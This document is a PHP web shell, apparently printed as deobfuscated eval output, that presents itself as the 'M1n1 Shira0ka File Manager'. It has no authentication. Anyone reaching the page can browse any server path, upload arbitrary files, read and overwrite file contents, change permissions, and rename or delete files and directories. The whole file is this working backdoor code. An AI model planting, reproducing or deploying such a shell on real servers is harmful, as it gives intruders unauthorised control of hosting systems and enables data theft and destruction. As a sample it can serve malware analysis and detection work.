<?php

/* #1: PHPDeobfuscator eval output */ 
    echo "<!DOCTYPE HTML>\r\n<HTML>\r\n<HEAD>\r\n<link href=\"\" rel=\"stylesheet\" type=\"text/css\">\r\n<title>M1n1 Shira0ka</title>\r\n<style>\r\nbody{\r\n\tfont-family: \"Racing Sans One\", cursive;\r\n\tbackground-color: #e6e6e6;\r\n\ttext-shadow:0px 0px 1px #757575;\r\n}\r\n#content tr:hover{\r\nbackground-color: #636263;\r\ntext-shadow:0px 0px 10px #fff;\r\n}\r\n#content .first{\r\nbackground-color: silver;\r\n}\r\n#content .first:hover{\r\nbackground-color: silver;\r\ntext-shadow:0px 0px 1px #757575;\r\n}\r\ntable{\r\n\tborder: 1px #000000 dotted;\r\n}\r\nH1{\r\n\tfont-family: \"Rye\", cursive;\r\n}\r\na{\r\n\tcolor: #000;\r\n\ttext-decoration: none;\r\n}\r\na:hover{\r\n\tcolor: #fff;\r\n\ttext-shadow:0px 0px 10px #ffffff;\r\n}\r\ninput,select,textarea{\r\n\tborder: 1px #000000 solid;\r\n\t-moz-border-radius: 5px;\r\n\t-webkit-border-radius:5px;\r\n\tborder-radius:5px;\r\n}\r\n</style>\r\n</HEAD>\r\n<BODY>\r\n<H1><center>M1n1 Shira0ka File Manager</center></H1>\r\n<table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">\r\n<tr><td>Current Path : ";
    if (isset($_GET['path'])) {
        $path = $_GET['path'];
    } else {
        $path = getcwd();
    }
    $path = str_replace('\\', '/', $path);
    $paths = explode('/', $path);
    foreach ($paths as $id => $pat) {
        if ($pat == '' && $id == 0) {
            $a = true;
            echo "<a href=\"?path=/\">/</a>";
            continue;
        }
        if ($pat == '') {
            continue;
        }
        echo "<a href=\"?path=";
        for ($i = 0; $i <= $id; $i++) {
            echo "{$paths[$i]}";
            if ($i != $id) {
                echo "/";
            }
        }
        echo '">' . $pat . '</a>/';
    }
    echo "</td></tr><tr><td>";
    if (isset($_FILES['file'])) {
        if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
            echo "<font color=\"green\">File Upload Done.</font><br />";
        } else {
            echo "<font color=\"red\">File Upload Error.</font><br />";
        }
    }
    echo "<form enctype=\"multipart/form-data\" method=\"POST\">\r\nUpload File : <input type=\"file\" name=\"file\" />\r\n<input type=\"submit\" value=\"upload\" />\r\n</form>\r\n</td></tr>";
    if (isset($_GET['filesrc'])) {
        echo "<tr><td>Current File : ";
        echo $_GET['filesrc'];
        echo "</tr></td></table><br />";
        echo '<pre>' . htmlspecialchars(file_get_contents($_GET['filesrc'])) . '</pre>';
    } elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
        echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
        if ($_POST['opt'] == 'chmod') {
            if (isset($_POST['perm'])) {
                if (chmod($_POST['path'], $_POST['perm'])) {
                    echo "<font color=\"green\">Change Permission Done.</font><br />";
                } else {
                    echo "<font color=\"red\">Change Permission Error.</font><br />";
                }
            }
            echo '<form method="POST">
		Permission : <input name="perm" type="text" size="4" value="' . substr(sprintf('%o', fileperms($_POST['path'])), -4) . '" />
		<input type="hidden" name="path" value="' . $_POST['path'] . '">
		<input type="hidden" name="opt" value="chmod">
		<input type="submit" value="Go" />
		</form>';
        } elseif ($_POST['opt'] == 'rename') {
            if (isset($_POST['newname'])) {
                if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                    echo "<font color=\"green\">Change Name Done.</font><br />";
                } else {
                    echo "<font color=\"red\">Change Name Error.</font><br />";
                }
                $_POST['name'] = $_POST['newname'];
            }
            echo '<form method="POST">
		New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" />
		<input type="hidden" name="path" value="' . $_POST['path'] . '">
		<input type="hidden" name="opt" value="rename">
		<input type="submit" value="Go" />
		</form>';
        } elseif ($_POST['opt'] == 'edit') {
            if (isset($_POST['src'])) {
                $fp = fopen($_POST['path'], 'w');
                if (fwrite($fp, $_POST['src'])) {
                    echo "<font color=\"green\">Edit File Done.</font><br />";
                } else {
                    echo "<font color=\"red\">Edit File Error.</font><br />";
                }
                fclose($fp);
            }
            echo '<form method="POST">
		<textarea cols=80 rows=20 name="src">' . htmlspecialchars(file_get_contents($_POST['path'])) . '</textarea><br />
		<input type="hidden" name="path" value="' . $_POST['path'] . '">
		<input type="hidden" name="opt" value="edit">
		<input type="submit" value="Go" />
		</form>';
        }
        echo "</center>";
    } else {
        echo "</table><br /><center>";
        if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
            if ($_POST['type'] == 'dir') {
                if (rmdir($_POST['path'])) {
                    echo "<font color=\"green\">Delete Dir Done.</font><br />";
                } else {
                    echo "<font color=\"red\">Delete Dir Error.</font><br />";
                }
            } elseif ($_POST['type'] == 'file') {
                if (unlink($_POST['path'])) {
                    echo "<font color=\"green\">Delete File Done.</font><br />";
                } else {
                    echo "<font color=\"red\">Delete File Error.</font><br />";
                }
            }
        }
        echo "</center>";
        $scandir = scandir($path);
        echo "<div id=\"content\"><table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">\r\n\t<tr class=\"first\">\r\n\t<td><center>Name</center></td>\r\n\t<td><center>Size</center></td>\r\n\t<td><center>Permissions</center></td>\r\n\t<td><center>Options</center></td>\r\n\t</tr>";
        foreach ($scandir as $dir) {
            if (!is_dir("{$path}/{$dir}") || $dir == '.' || $dir == '..') {
                continue;
            }
            echo "<tr>\r\n\t\t<td><a href=\"?path={$path}/{$dir}\">{$dir}</a></td>\r\n\t\t<td><center>--</center></td>\r\n\t\t<td><center>";
            if (is_writable("{$path}/{$dir}")) {
                echo "<font color=\"green\">";
            } elseif (!is_readable("{$path}/{$dir}")) {
                echo "<font color=\"red\">";
            }
            echo perms("{$path}/{$dir}");
            if (is_writable("{$path}/{$dir}") || !is_readable("{$path}/{$dir}")) {
                echo "</font>";
            }
            echo "</center></td>\r\n\t\t<td><center><form method=\"POST\" action=\"?option&path={$path}\">\r\n\t\t<select name=\"opt\">\r\n\t\t<option value=\"\"></option>\r\n\t\t<option value=\"delete\">Delete</option>\r\n\t\t<option value=\"chmod\">Chmod</option>\r\n\t\t<option value=\"rename\">Rename</option>\r\n\t\t</select>\r\n\t\t<input type=\"hidden\" name=\"type\" value=\"dir\">\r\n\t\t<input type=\"hidden\" name=\"name\" value=\"{$dir}\">\r\n\t\t<input type=\"hidden\" name=\"path\" value=\"{$path}/{$dir}\">\r\n\t\t<input type=\"submit\" value=\">\" />\r\n\t\t</form></center></td>\r\n\t\t</tr>";
        }
        echo "<tr class=\"first\"><td></td><td></td><td></td><td></td></tr>";
        foreach ($scandir as $file) {
            if (!is_file("{$path}/{$file}")) {
                continue;
            }
            $size = filesize("{$path}/{$file}") / 1024;
            $size = round($size, 3);
            if ($size >= 1024) {
                $size = round($size / 1024, 2) . ' MB';
            } else {
                $size .= ' KB';
            }
            echo "<tr>\r\n\t\t<td><a href=\"?filesrc={$path}/{$file}&path={$path}\">{$file}</a></td>\r\n\t\t<td><center>" . $size . "</center></td>\r\n\t\t<td><center>";
            if (is_writable("{$path}/{$file}")) {
                echo "<font color=\"green\">";
            } elseif (!is_readable("{$path}/{$file}")) {
                echo "<font color=\"red\">";
            }
            echo perms("{$path}/{$file}");
            if (is_writable("{$path}/{$file}") || !is_readable("{$path}/{$file}")) {
                echo "</font>";
            }
            echo "</center></td>\r\n\t\t<td><center><form method=\"POST\" action=\"?option&path={$path}\">\r\n\t\t<select name=\"opt\">\r\n\t\t<option value=\"\"></option>\r\n\t\t<option value=\"delete\">Delete</option>\r\n\t\t<option value=\"chmod\">Chmod</option>\r\n\t\t<option value=\"rename\">Rename</option>\r\n\t\t<option value=\"edit\">Edit</option>\r\n\t\t</select>\r\n\t\t<input type=\"hidden\" name=\"type\" value=\"file\">\r\n\t\t<input type=\"hidden\" name=\"name\" value=\"{$file}\">\r\n\t\t<input type=\"hidden\" name=\"path\" value=\"{$path}/{$file}\">\r\n\t\t<input type=\"submit\" value=\">\" />\r\n\t\t</form></center></td>\r\n\t\t</tr>";
        }
        echo "</table>\r\n\t</div>";
    }
    echo "<br><center>GO Party By <font color=\"red\">You</font></center>\r\n</BODY>\r\n</HTML>";
    function perms($file)
    {
        $perms = fileperms($file);
        if (($perms & 0xc000) == 0xc000) {
            // Socket
            $info = 's';
        } elseif (($perms & 0xa000) == 0xa000) {
            // Symbolic Link
            $info = 'l';
        } elseif (($perms & 0x8000) == 0x8000) {
            // Regular
            $info = '-';
        } elseif (($perms & 0x6000) == 0x6000) {
            // Block special
            $info = 'b';
        } elseif (($perms & 0x4000) == 0x4000) {
            // Directory
            $info = 'd';
        } elseif (($perms & 0x2000) == 0x2000) {
            // Character special
            $info = 'c';
        } elseif (($perms & 0x1000) == 0x1000) {
            // FIFO pipe
            $info = 'p';
        } else {
            // Unknown
            $info = 'u';
        }
        // Owner
        $info .= $perms & 0x100 ? 'r' : '-';
        $info .= $perms & 0x80 ? 'w' : '-';
        $info .= $perms & 0x40 ? $perms & 0x800 ? 's' : 'x' : ($perms & 0x800 ? 'S' : '-');
        // Group
        $info .= $perms & 0x20 ? 'r' : '-';
        $info .= $perms & 0x10 ? 'w' : '-';
        $info .= $perms & 0x8 ? $perms & 0x400 ? 's' : 'x' : ($perms & 0x400 ? 'S' : '-');
        // World
        $info .= $perms & 0x4 ? 'r' : '-';
        $info .= $perms & 0x2 ? 'w' : '-';
        $info .= $perms & 0x1 ? $perms & 0x200 ? 't' : 'x' : ($perms & 0x200 ? 'T' : '-');
        return $info;
    }
/* END:#1 */
